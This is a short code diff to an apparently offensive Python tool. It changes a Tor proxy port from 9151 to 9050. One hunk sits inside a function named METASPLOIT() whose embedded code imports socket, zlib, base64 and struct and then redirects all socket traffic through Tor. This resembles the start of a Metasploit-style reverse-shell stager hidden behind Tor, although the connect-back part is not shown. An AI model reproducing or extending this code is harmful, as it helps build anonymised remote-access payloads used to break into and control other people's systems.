@@ -21,8 +21,8 @@ import shutil
 import string
 import socks
 proxies = {
-    'http': 'socks5h://127.0.0.1:9151',  # Tor proxy address and port for HTTP
-    'https': 'socks5h://127.0.0.1:9151'  # Tor proxy address and port for HTTPS
+    'http': 'socks5h://127.0.0.1:9050',  # Tor proxy address and port for HTTP
+    'https': 'socks5h://127.0.0.1:9050'  # Tor proxy address and port for HTTPS
 }
 
 requests_session = requests.Session()
@@ -165,7 +165,7 @@ def METASPLOIT():
                         import socket, zlib, base64, struct, time, random
                         import socks
 
-                        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 9151)  # Use Tor's default port
+                        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 9050)  # Use Tor's default port
                         socket.socket = socks.socksocket  # Redirect all socket traffic through Tor
 
                         while True:
